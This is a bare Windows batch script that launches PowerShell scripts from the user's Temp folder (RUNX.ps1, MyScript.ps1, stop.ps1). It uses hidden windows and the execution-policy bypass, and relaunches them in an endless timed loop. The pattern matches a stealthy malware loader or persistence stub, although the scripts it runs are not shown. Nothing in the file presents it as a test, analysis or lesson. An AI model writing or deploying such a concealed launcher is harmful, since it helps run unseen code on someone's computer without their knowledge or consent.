@echo off
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\RUNX.ps1"
:loop
timeout /t 3 >nul
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
timeout /t 60 >nul
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\stop.ps1"
timeout /t 1 >nul
goto loop
